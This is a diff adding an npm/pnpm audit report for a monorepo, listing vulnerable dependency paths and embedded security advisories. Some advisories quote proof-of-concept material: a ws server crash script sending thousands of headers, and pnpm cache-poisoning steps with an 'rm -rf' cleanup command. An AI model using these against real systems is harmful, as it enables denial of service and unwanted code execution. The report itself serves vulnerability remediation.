@@ -1,0 +1,2017 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1101846,
+          "path": "packages__lone-star-platform>koa-route>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "path-to-regexp",
+      "target": "6.3.0",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1103618,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1103903,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>@nestjs/common",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106849,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>inquirer>external-editor>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107599,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@openapitools/openapi-generator-cli",
+      "target": "2.24.0",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1104000,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>nest-openapi-tools>@openapitools/openapi-generator-cli>concurrently>date-fns>@babel/runtime",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@babel/runtime",
+      "target": "7.28.4",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1104001,
+          "path": "packages__lone-star-platform>jest>@jest/core>@jest/reporters>istanbul-lib-instrument>@babel/core>@babel/helpers",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@babel/helpers",
+      "target": "7.28.4",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1104677,
+          "path": "packages__lone-star-platform>@newrelic/native-metrics>prebuildify>tar-fs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106930,
+          "path": "packages__lone-star-platform>@newrelic/native-metrics>prebuildify>tar-fs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tar-fs",
+      "target": "2.1.4",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1105444,
+          "path": "packages__lone-star-platform>ts-jest>ejs>jake>filelist>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "2.0.2",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1106507,
+          "path": "packages__clients__atlas>@types/node-fetch>form-data",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "form-data",
+      "target": "4.0.4",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1107324,
+          "path": "packages__storage__sqlite-ops>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107328,
+          "path": "packages__storage__sqlite-ops>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "vite",
+      "target": "7.1.7",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "ws",
+      "resolves": [
+        {
+          "id": 1098392,
+          "path": "packages__lone-star-platform>puppeteer>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "body-parser",
+      "resolves": [
+        {
+          "id": 1099520,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "send",
+      "resolves": [
+        {
+          "id": 1100526,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>send",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "serve-static",
+      "resolves": [
+        {
+          "id": 1100528,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>serve-static",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "express",
+      "resolves": [
+        {
+          "id": 1100530,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "mongoose",
+      "resolves": [
+        {
+          "id": 1101063,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>mongoose",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101840,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>mongoose",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "pnpm",
+      "resolves": [
+        {
+          "id": 1101099,
+          "path": ".>pnpm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1104027,
+          "path": ".>pnpm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "path-to-regexp",
+      "resolves": [
+        {
+          "id": 1101848,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/core>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101849,
+          "path": "packages__lone-star-platform>@types/koa-route>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1101850,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105199,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "koa",
+      "resolves": [
+        {
+          "id": 1102314,
+          "path": "packages__lone-star-platform>koa",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1103877,
+          "path": "packages__lone-star-platform>koa",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106835,
+          "path": "packages__lone-star-platform>koa",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "axios",
+      "resolves": [
+        {
+          "id": 1103618,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1103618,
+          "path": "packages__lone-star-platform>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107599,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107599,
+          "path": "packages__lone-star-platform>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nestjs/common",
+      "resolves": [
+        {
+          "id": 1103903,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/common",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cross-spawn",
+      "resolves": [
+        {
+          "id": 1104663,
+          "path": "packages__plugins-mock-atlas>webpack-spawn-plugin>cross-spawn",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1104663,
+          "path": "packages__plugins-mock-atlas>webpack-spawn-plugin>fkill>pid-from-port>execa>cross-spawn",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1104664,
+          "path": "packages__base-game-lib>eslint>cross-spawn",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "multer",
+      "resolves": [
+        {
+          "id": 1104780,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1105262,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1106463,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "formidable",
+      "resolves": [
+        {
+          "id": 1105075,
+          "path": "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>superagent>formidable",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "brace-expansion",
+      "resolves": [
+        {
+          "id": 1105443,
+          "path": ".>@aristocrattechnologiesinc/random-number>grpc-tools>@mapbox/node-pre-gyp>rimraf>glob>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "form-data",
+      "resolves": [
+        {
+          "id": 1106509,
+          "path": "packages__logging__newrelic>newrelic>@newrelic/security-agent>sync-request>then-request>form-data",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1098392": {
+      "findings": [
+        {
+          "version": "8.6.0",
+          "paths": [
+            "packages__lone-star-platform>puppeteer>ws"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n- https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f\n- https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e\n- https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c\n- https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63\n- https://github.com/advisories/GHSA-3h5v-q93c-6h6q",
+      "created": "2024-06-17T19:09:10.000Z",
+      "id": 1098392,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+      "reported_by": null,
+      "title": "ws affected by a DoS when handling a request with many HTTP headers",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-37890"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "ws",
+      "vulnerable_versions": ">=8.0.0 <8.17.1",
+      "github_advisory_id": "GHSA-3h5v-q93c-6h6q",
+      "recommendation": "Upgrade to version 8.17.1 or later",
+      "patched_versions": ">=8.17.1",
+      "updated": "2024-08-05T05:02:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-476"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h5v-q93c-6h6q"
+    },
+    "1099520": {
+      "findings": [
+        {
+          "version": "1.20.2",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>body-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-qwcr-r2fm-qrc7\n- https://github.com/expressjs/body-parser/commit/b2695c4450f06ba3b0ccf48d872a229bb41c9bce\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45590\n- https://github.com/advisories/GHSA-qwcr-r2fm-qrc7",
+      "created": "2024-09-10T15:52:39.000Z",
+      "id": 1099520,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n",
+      "reported_by": null,
+      "title": "body-parser vulnerable to denial of service when url encoding is enabled",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-45590"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.3",
+      "github_advisory_id": "GHSA-qwcr-r2fm-qrc7",
+      "recommendation": "Upgrade to version 1.20.3 or later",
+      "patched_versions": ">=1.20.3",
+      "updated": "2024-09-10T19:01:11.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-qwcr-r2fm-qrc7"
+    },
+    "1100526": {
+      "findings": [
+        {
+          "version": "0.18.0",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>send"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43799\n- https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35\n- https://github.com/advisories/GHSA-m6fv-jmcg-4jfg",
+      "created": "2024-09-10T19:42:41.000Z",
+      "id": 1100526,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+      "reported_by": null,
+      "title": "send vulnerable to template injection that can lead to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43799"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "send",
+      "vulnerable_versions": "<0.19.0",
+      "github_advisory_id": "GHSA-m6fv-jmcg-4jfg",
+      "recommendation": "Upgrade to version 0.19.0 or later",
+      "patched_versions": ">=0.19.0",
+      "updated": "2024-11-18T16:27:12.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m6fv-jmcg-4jfg"
+    },
+    "1100528": {
+      "findings": [
+        {
+          "version": "1.15.0",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>serve-static"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/serve-static/security/advisories/GHSA-cm22-4g7w-348p\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43800\n- https://github.com/expressjs/serve-static/commit/0c11fad159898cdc69fd9ab63269b72468ecaf6b\n- https://github.com/expressjs/serve-static/commit/ce730896fddce1588111d9ef6fdf20896de5c6fa\n- https://github.com/advisories/GHSA-cm22-4g7w-348p",
+      "created": "2024-09-10T19:42:33.000Z",
+      "id": 1100528,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+      "reported_by": null,
+      "title": "serve-static vulnerable to template injection that can lead to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43800"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "serve-static",
+      "vulnerable_versions": "<1.16.0",
+      "github_advisory_id": "GHSA-cm22-4g7w-348p",
+      "recommendation": "Upgrade to version 1.16.0 or later",
+      "patched_versions": ">=1.16.0",
+      "updated": "2024-11-18T16:27:12.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-cm22-4g7w-348p"
+    },
+    "1100530": {
+      "findings": [
+        {
+          "version": "4.19.2",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/express/security/advisories/GHSA-qw6h-vgh9-j6wx\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43796\n- https://github.com/expressjs/express/commit/54271f69b511fea198471e6ff3400ab805d6b553\n- https://github.com/advisories/GHSA-qw6h-vgh9-j6wx",
+      "created": "2024-09-10T19:41:04.000Z",
+      "id": 1100530,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+      "reported_by": null,
+      "title": "express vulnerable to XSS via response.redirect()",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43796"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "express",
+      "vulnerable_versions": "<4.20.0",
+      "github_advisory_id": "GHSA-qw6h-vgh9-j6wx",
+      "recommendation": "Upgrade to version 4.20.0 or later",
+      "patched_versions": ">=4.20.0",
+      "updated": "2024-11-18T16:27:12.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qw6h-vgh9-j6wx"
+    },
+    "1101063": {
+      "findings": [
+        {
+          "version": "8.6.2",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>mongoose"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-53900\n- https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156\n- https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\n- https://github.com/Automattic/mongoose/releases\n- https://www.npmjs.com/package/mongoose?activeTab=versions\n- https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b\n- https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5\n- https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3\n- https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3\n- https://github.com/advisories/GHSA-m7xq-9374-9rvx",
+      "created": "2024-12-02T21:31:20.000Z",
+      "id": 1101063,
+      "npm_advisory_id": null,
+      "overview": "Mongoose versions prior to 8.8.3, 7.8.3, and 6.13.5 are vulnerable to improper use of the $where operator. This vulnerability arises from the ability of the $where clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.",
+      "reported_by": null,
+      "title": "Mongoose search injection vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-53900"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "mongoose",
+      "vulnerable_versions": ">=8.0.0-rc0 <8.8.3",
+      "github_advisory_id": "GHSA-m7xq-9374-9rvx",
+      "recommendation": "Upgrade to version 8.8.3 or later",
+      "patched_versions": ">=8.8.3",
+      "updated": "2024-12-04T16:41:02.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-m7xq-9374-9rvx"
+    },
+    "1101099": {
+      "findings": [
+        {
+          "version": "9.9.0",
+          "paths": [
+            ".>pnpm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r\n- https://nvd.nist.gov/vuln/detail/CVE-2024-53866\n- https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743\n- https://github.com/advisories/GHSA-vm32-9rqf-rh3r",
+      "created": "2024-12-10T22:42:41.000Z",
+      "id": 1101099,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\npnpm seems to mishandle overrides and global cache:\n1. Overrides from one workspace leak into npm metadata saved in global cache\n2. npm metadata from global cache affects other workspaces\n3. installs by default don't revalidate the data (including on first lockfile generation)\n\nThis can make workspace A (even running with `ignore-scripts=true`) posion global cache and execute scripts in workspace B\n\nUsers generally expect `ignore-scripts` to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).\n\nHere, that expectation is broken\n\n### Details\n\nSee PoC.\n\nIn it, overrides from a single run of A get leaked into e.g. `~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json` and persistently affect all other projects using the cache\n\n### PoC\n\nPostinstall code used in PoC is benign and can be inspected in <https://www.npmjs.com/package/ponyhooves?activeTab=code>, it's just a `console.log`\n\n1. Remove store and cache\n   On mac: `rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store`\n   This step is not required in general, but we'll be using a popular package for PoC that's likely cached\n2. Create `A/package.json`:\n   ```json\n   {\n     \"name\": \"A\",\n     \"pnpm\": { \"overrides\": { \"rimraf>glob\": \"npm:ponyhooves@1\" } },\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i --ignore-scripts` (the flag is not required, but the point of the demo is to show that it doesn't help)\n4. Create `B/package.json`:\n   ```json\n   {\n     \"name\": \"B\",\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i`\n\nResult:\n```console\nPackages: +3\n+++\nProgress: resolved 3, reused 3, downloaded 0, added 3, done\nnode_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms\n\ndependencies:\n+ rimraf 6.0.1\n\nDone in 1.4s\n```\n\nAlso, that code got leaked into another project and it's lockfile now! \n\n### Impact\n\nGlobal state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs\n\nAs a work-around, use separate cache and store dirs in each workspace\n",
+      "reported_by": null,
+      "title": "pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-53866"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "pnpm",
+      "vulnerable_versions": "<9.15.0",
+      "github_advisory_id": "GHSA-vm32-9rqf-rh3r",
+      "recommendation": "Upgrade to version 9.15.0 or later",
+      "patched_versions": ">=9.15.0",
+      "updated": "2024-12-10T22:42:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-346",
+        "CWE-426"
+      ],
+      "url": "https://github.com/advisories/GHSA-vm32-9rqf-rh3r"
+    },
+    "1101840": {
+      "findings": [
+        {
+          "version": "8.6.2",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>mongoose"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-23061\n- https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc\n- https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\n- https://github.com/Automattic/mongoose/releases/tag/8.9.5\n- https://www.npmjs.com/package/mongoose?activeTab=versions\n- https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6\n- https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4\n- https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5\n- https://github.com/Automattic/mongoose/releases/tag/6.13.6\n- https://github.com/Automattic/mongoose/releases/tag/7.8.4\n- https://github.com/advisories/GHSA-m7xq-9374-9rvx\n- https://github.com/advisories/GHSA-vg7j-7cwx-8wgw",
+      "created": "2025-01-15T06:30:49.000Z",
+      "id": 1101840,
+      "npm_advisory_id": null,
+      "overview": "Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the `$where` operator. This vulnerability arises from the ability of the `$where` clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.\n\nNOTE: this issue exists because of an incomplete fix for CVE-2024-53900.",
+      "reported_by": null,
+      "title": "Mongoose search injection vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-23061"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "mongoose",
+      "vulnerable_versions": ">=8.0.0-rc0 <8.9.5",
+      "github_advisory_id": "GHSA-vg7j-7cwx-8wgw",
+      "recommendation": "Upgrade to version 8.9.5 or later",
+      "patched_versions": ">=8.9.5",
+      "updated": "2025-01-17T18:02:41.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"
+    },
+    "1101846": {
+      "findings": [
+        {
+          "version": "6.2.2",
+          "paths": [
+            "packages__lone-star-platform>koa-route>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
